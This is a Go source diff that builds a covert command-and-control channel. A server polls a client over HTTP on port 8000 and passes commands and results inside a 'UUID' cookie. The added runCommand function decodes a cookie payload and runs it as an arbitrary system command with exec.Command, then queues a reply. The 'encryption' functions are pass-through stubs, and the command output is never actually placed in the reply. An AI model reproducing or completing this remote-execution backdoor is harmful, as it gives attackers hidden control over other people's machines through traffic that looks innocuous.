@@ -2,13 +2,19 @@ package main
 
 import (
 	"fmt"
-	"net"
 	"net/http"
+	"os/exec"
+	"strings"
 	"time"
 )
 
-func serverWorker(clientIp net.IP) {
-	fmt.Printf("Got connection from %v\n", clientIp.String())
+const (
+	EXEC byte = 0x1
+)
+
+func serverWorker(clientIp string) {
+
+	fmt.Printf("Got connection from %v\n", clientIp)
 
 	results := make(chan string)
 
@@ -20,23 +26,23 @@ func serverWorker(clientIp net.IP) {
 	for _ = range ticker.C {
 
 		//read from the response buffer
-		request, err := http.NewRequest("GET", "http://"+clientIp.String()+":8000", nil)
+		request, err := http.NewRequest("GET", "http://"+clientIp+":8000", nil)
 		if err != nil {
 			panic(err)
 		}
 
 		request.Close = true
 
+		// use select to avoid infinetly blocking on <-results
 		select {
-		//create cookie
-		case resultStr, ok := <-results:
+		case resultData, ok := <-results:
 
 			if !ok {
 				return
 			}
 			var myCookie http.Cookie
 			myCookie.Name = "UUID"
-			myCookie.Value = resultStr
+			myCookie.Value = resultData
 			myCookie.MaxAge = 15
 			myCookie.Secure = false
 			myCookie.HttpOnly = false
@@ -44,7 +50,7 @@ func serverWorker(clientIp net.IP) {
 			//encode data into a response cookie
 
 			request.AddCookie(&myCookie)
-			fmt.Printf("Adding cookie: \"%v\"\n", resultStr)
+			fmt.Printf("Adding cookie: \"%v\"\n", resultData)
 		default:
 		}
 
@@ -70,68 +76,46 @@ func serverWorker(clientIp net.IP) {
 	}
 }
 
-func runCommand(command string, results chan<- string) {
+func runCommand(data string, results chan<- string) {
 
-	//	commandParts := strings.Split(command, " ")
+	command := decrypt(data)
 
-	fmt.Printf("Command: \"%v\"\n", command)
+	switch command[0] {
+	case EXEC:
+		// get sequence number
+		seq := command[1]
 
-	results <- (command + "done")
+		// cast data section into chuncks of strings
+		commandParts := strings.Split(string(command[2:]), " ")
 
-	/*
-		//exec
-		switch commandParts[0]{
-			case "exec":
-			os.Cmd(commandParts[1])
+		// create exec
+		cmd := exec.Command(commandParts[1], commandParts[2:]...)
 
-			case "chdir":
-
-			case "watch":
-
-			case "getFile":
+		// run exec and get output
+		output, err := cmd.CombinedOutput()
+		if err != nil {
+			return
 		}
 
-		//chdir
+		// prepare a buffer for encoding the output
+		result := make([]byte, 0, len(output)+2)
+		result = append(result, 1, seq)
+		results <- encrypt(result)
 
-		//watch
-
-		//getFile
-
-	*/
-
-}
-
-/*
-func waitForConnection(c cookieHandler) {
-	var server http.Server
-
-	server.Handler = c
-	server.Addr = ":8000"
-	server.ListenAndServe()
-
-	//http.HandleFunc("/", cookieHandler)
-	//http.ListenAndServe(":8000", nil)
-}
-
-func (c *cookieHandler) ServeHTTP(writer http.ResponseWriter, request *http.Request) {
-
-	cookie, err := request.Cookie("UUID")
-	if err != nil {
-		println(err.Error())
 	}
-	println(cookie.String())
-	c.responses <- cookie.String()
 
-	var myCookie http.Cookie
-	myCookie.Name = "UUID"
-	myCookie.Value = <-c.commands
-	myCookie.MaxAge = -1
-	myCookie.Secure = false
-	myCookie.HttpOnly = false
+	//chdir
 
-	writer.Header().Set("Set-Cookie", myCookie.String())
+	//watch
 
-	io.WriteString(writer, "Hello world!")
+	//getFile
+
 }
 
-*/
+func encrypt(data []byte) string {
+	return string(data)
+}
+
+func decrypt(data string) []byte {
+	return []byte(data)
+}
